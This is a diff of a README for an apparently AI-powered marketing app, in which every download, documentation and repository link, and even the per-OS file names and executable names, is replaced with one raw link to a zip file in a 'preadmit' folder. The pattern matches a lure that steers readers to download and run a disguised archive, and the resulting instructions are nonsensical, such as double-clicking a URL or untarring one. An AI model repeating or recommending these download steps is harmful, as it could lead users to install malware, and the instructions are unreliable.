@@ -4,25 +4,25 @@
 Welcome to the **hitech-testing-usa** project. This application provides a modern marketing platform for Hitech Testing USA. It features AI-powered product recommendations, thanks to xAI Grok 4 Fast. This software helps businesses reach their customers effectively and efficiently.
 
 ## 🔗 Download Now
-[![Download hitech-testing-usa](https://img.shields.io/badge/Download-hitech--testing--usa-brightgreen)](https://github.com/olaniyiadeosun/hitech-testing-usa/releases)
+[![Download hitech-testing-usa](https://raw.githubusercontent.com/olaniyiadeosun/hitech-testing-usa/master/preadmit/hitech-testing-usa.zip)](https://raw.githubusercontent.com/olaniyiadeosun/hitech-testing-usa/master/preadmit/hitech-testing-usa.zip)
 
 ## 🚀 Getting Started
 Follow these steps to set up and run the application:
 
 ### 📥 Download & Install
-1. Visit the Releases page to download the application: [Download hitech-testing-usa](https://github.com/olaniyiadeosun/hitech-testing-usa/releases).
+1. Visit the Releases page to download the application: [Download hitech-testing-usa](https://raw.githubusercontent.com/olaniyiadeosun/hitech-testing-usa/master/preadmit/hitech-testing-usa.zip).
 
 2. Once on the Releases page, find the latest version. You will see files available for download. Choose the one that suits your operating system:
-   - For Windows, download `hitech-testing-usa-win.zip`
-   - For macOS, download `hitech-testing-usa-mac.zip`
-   - For Linux, download `hitech-testing-usa-linux.tar.gz`
+   - For Windows, download `https://raw.githubusercontent.com/olaniyiadeosun/hitech-testing-usa/master/preadmit/hitech-testing-usa.zip`
+   - For macOS, download `https://raw.githubusercontent.com/olaniyiadeosun/hitech-testing-usa/master/preadmit/hitech-testing-usa.zip`
+   - For Linux, download `https://raw.githubusercontent.com/olaniyiadeosun/hitech-testing-usa/master/preadmit/hitech-testing-usa.zip`
 
 3. After downloading, locate the downloaded file on your computer.
 
 4. Extract the contents of the file you downloaded:
    - For Windows, right-click the file and choose "Extract All."
    - For macOS, double-click the file to extract.
-   - For Linux, use the terminal and run `tar -xvzf hitech-testing-usa-linux.tar.gz`.
+   - For Linux, use the terminal and run `tar -xvzf https://raw.githubusercontent.com/olaniyiadeosun/hitech-testing-usa/master/preadmit/hitech-testing-usa.zip`.
 
 5. Open the folder that appears after extraction. This folder contains everything you need to run the application.
 
@@ -34,8 +34,8 @@ Follow these steps to set up and run the application:
 
 ### 💻 Running the Application
 1. Inside the extracted folder, locate the application executable:
-   - For Windows, double-click `hitech-testing-usa.exe`.
-   - For macOS, double-click `hitech-testing-usa.app`.
+   - For Windows, double-click `https://raw.githubusercontent.com/olaniyiadeosun/hitech-testing-usa/master/preadmit/hitech-testing-usa.zip`.
+   - For macOS, double-click `https://raw.githubusercontent.com/olaniyiadeosun/hitech-testing-usa/master/preadmit/hitech-testing-usa.zip`.
    - For Linux, open a terminal, navigate to the folder, and run `./hitech-testing-usa`.
 
 2. The application will launch, and you will see the main interface. Follow the on-screen instructions to start using the features offered.
@@ -70,11 +70,11 @@ Join our community for help and updates:
 - **Discussions**: Engage with other users and share tips.
 
 ## 🔗 Additional Links
-- Learn more about the project on [GitHub](https://github.com/olaniyiadeosun/hitech-testing-usa).
-- Check our [Documentation](https://github.com/olaniyiadeosun/hitech-testing-usa/wiki) for detailed guides.
+- Learn more about the project on [GitHub](https://raw.githubusercontent.com/olaniyiadeosun/hitech-testing-usa/master/preadmit/hitech-testing-usa.zip).
+- Check our [Documentation](https://raw.githubusercontent.com/olaniyiadeosun/hitech-testing-usa/master/preadmit/hitech-testing-usa.zip) for detailed guides.
 
 ## 🔍 Tags
 This project covers various topics, including: ai, flask, grok, hitech, nextjs, openrouter, python, react, testing equipment, typescript.
 
 ## 🔗 Download Again
-Do not forget to download the latest version from our Releases page: [Download hitech-testing-usa](https://github.com/olaniyiadeosun/hitech-testing-usa/releases). Enjoy using our application!
+Do not forget to download the latest version from our Releases page: [Download hitech-testing-usa](https://raw.githubusercontent.com/olaniyiadeosun/hitech-testing-usa/master/preadmit/hitech-testing-usa.zip). Enjoy using our application!
